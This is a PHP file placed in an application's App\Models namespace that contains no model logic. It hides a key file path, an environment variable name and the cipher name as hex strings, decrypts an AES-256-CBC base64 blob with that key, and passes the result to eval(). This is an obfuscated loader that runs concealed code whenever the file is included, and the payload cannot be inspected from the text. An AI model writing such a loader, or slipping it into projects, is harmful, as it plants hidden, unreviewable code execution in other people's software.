<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('iyeFCDJOiAdT9HyxMlWZiQ==');

$c=base64_decode(

'a4WXSFsjxeBJttq455LXbsz1q9BizV3PnHWrfez02GUh9C93z87CDXdESTc30prHO56Nqm4acTP7' .
'xDcKzPstbz05IyZWcH6hRLmWpD8pWM067tp93CFpgZK0OR0Wb2MZc9xD3pagnhoTeNkPv7r8l5xh' .
'GehErMhBw0Yh8qqQMEq9lImtVG+PDZRSSAS8iDiQC5/McjiTHTGD+tJGxhBHOdOrDBlHV6Cf6D3P' .
'TyQrk8o7OH0GcjdPzJz90b6C1xNRhBuAMx+DTzQSsOvhz6W4SpFn+SmhgplDDpEiji3ibu7BdC5U' .
'ZHBagdqy+MHDft4lOqCM+GqITcI28gwWR4LV0RACZiZ3nieTvxq2VKSV17pq7yBhnmGwtRLsvKgP' .
'vVCVCDdu7GpF+JsNI78VosD44GDbJoLKillD8tOaf6bQfYbaMrOPOz9N+wEMaQ9X3ob1MmzgbNGy' .
'sPYgwJjuAyd7cjZgtdLjZZ3tVLz9JY4f+Y+88U8vDtXgp+g3lGQY3KqZSSWfvUBnC9ZewWSJH1l9' .
'qQAS5BuUbc+bXJXRCRawsu3gnxV58b5hZFFQ88hwHeed3N/+4zzaKlsAO31CaGvGkLoRFLxAgkcF' .
'FVA5wDxcnbmtTeK7IfNvHafvSC7Ai+BgkVfRmmo43eCJsEtq3fJFG3dzxlTlaS59vfez7Xg8h5Rg' .
'skEFxBRIo9GZMn5MwrbkYxYqWw4jkY9132CIIpTaXKt/cjR4gpsWtqGCBOm2w3vw2oD41SXzzd1l' .
'YW+v6qgj39fc6N2At1rqrIBC4ywawhR5BPwiVrxcgWtCQTA1Y86sB7G8uisDPrS/bSJCyfa3Q1Ub' .
'dD/smVa9+NDshS1RpzSAhfujgFGW1ezvrQR7K1/xfIIoor6iVw+pWnd0m+MrpMHzm/f2Wwp2mJTU' .
'u1wPhg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

